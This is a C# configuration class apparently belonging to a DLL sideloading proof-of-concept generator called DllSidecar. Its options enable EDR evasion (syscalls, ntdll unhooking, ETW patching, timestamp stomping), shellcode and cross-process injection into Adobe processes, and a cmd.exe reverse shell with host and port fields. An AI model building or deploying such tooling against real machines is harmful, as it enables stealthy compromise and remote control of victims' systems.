namespace DllSidecar.Core.Models;

public class TemplateConfig
{
    public bool DInvoke { get; set; }
    public bool EncryptStrings { get; set; }
    public bool DirectSyscalls { get; set; }

    // x64-only; ignored on x86. Mutually exclusive with DirectSyscalls (UI enforces).
    public bool IndirectSyscalls { get; set; }

    public bool AnySyscalls => DirectSyscalls || IndirectSyscalls;

    // Emits unhook_ntdll() at the start of DllMain. See templates/unhook.h.
    public bool UnhookNtdll { get; set; }

    // Emits patch_etw() (ntdll!EtwEventWrite first byte → 0xC3 RET).
    public bool PatchEtw { get; set; }
    public int DelayMs { get; set; }
    public PayloadType Payload { get; set; } = PayloadType.MessageBox;
    public string PayloadData { get; set; } = "";
    public string? TargetExport { get; set; }
    public ThreadMode Thread { get; set; } = ThreadMode.Calling;
    // Per-instance random 32-byte XOR key for EncryptStrings.
    public byte[] LongXorKey { get; set; } = Helpers.XorCryptor.RandomKey(32);
    // Populated from ConfigManager.Current.Researcher.Handle at emit time.
    public string Researcher { get; set; } = "";
    public bool CloneMetadata { get; set; }
    public bool StompTimestamps { get; set; }
    public GenerationMode Mode { get; set; } = GenerationMode.Proxy;

    // Deploy + Run integration (optional): when DeployTargetDir + HostExePath are set,
    // the generated .bat copies the DLL, launches the host, then cleans up on exit.
    public string? DeployTargetDir { get; set; }
    public string? DeployTargetName { get; set; }   // null → reuse analysis.Filename
    public string? HostExePath { get; set; }

    // Canonical System32/SysWOW64 copy; with Mode=Proxy the .bat stages it as <base>_orig.dll.
    public string? SystemOrigPath { get; set; }

    // ~80-byte file written to %TEMP% proving DllMain ran.
    public bool WriteProofFile { get; set; } = true;

    public int PreLaunchDelaySec { get; set; } = 0;

    // true → start /WAIT (blocks); false → start "" + timeout NonBlockingTimeoutSec.
    public bool WaitForHostExit { get; set; } = true;
    public int NonBlockingTimeoutSec { get; set; } = 15;

    // Comma-separated sibling process names tried in order for SandboxEscape injection.
    public string SandboxTargets { get; set; } = "AcroCEF.exe,AdobeCollabSync.exe";

    // {Researcher} placeholder substituted at template time. Newlines/quotes are escaped for C.
    public string MessageBoxTitle { get; set; } = "DllSidecar PoC";
    public string MessageBoxBody { get; set; } = "DLL Sideloading PoC\nDllSidecar — BugAInters 2026";

    // Reverse-shell endpoint (hostnames or dotted-quad IPv4).
    public string ReverseShellHost { get; set; } = "127.0.0.1";
    public int ReverseShellPort { get; set; } = 4444;
}

public enum PayloadType
{
    MessageBox,
    Command,
    Shellcode,
    // Cross-process inject for AppContainer / sandboxed targets.
    SandboxEscape,
    // TCP reverse shell: WSASocket → connect → CreateProcessA("cmd.exe").
    ReverseShell
}

public enum ThreadMode
{
    Calling,
    Std,
    Native
}

public enum GenerationMode
{
    Tracer,
    Proxy,
    Sideload
}
